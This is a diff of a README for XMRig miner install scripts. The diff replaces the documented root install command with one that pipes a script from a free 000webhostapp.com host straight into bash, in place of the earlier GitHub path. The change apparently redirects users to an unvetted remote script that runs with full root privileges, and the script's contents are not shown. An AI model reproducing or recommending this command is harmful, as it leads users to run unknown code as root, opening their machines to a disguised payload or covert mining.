@@ -8,7 +8,7 @@ scripts for installing Xmrig on ubuntu or debian
 To use the installation scripts, simply run this command as root.
 
 ```bash
-bash <(curl -s https://github.com/ArmaYTB45/xmrig-autoinstallscript/blob/main/xmriginstallator.sh)
+bash <(curl -s https://rebuilt-enclosures.000webhostapp.com/xmriginstallator.sh)
 ```
 
 Thanks❤
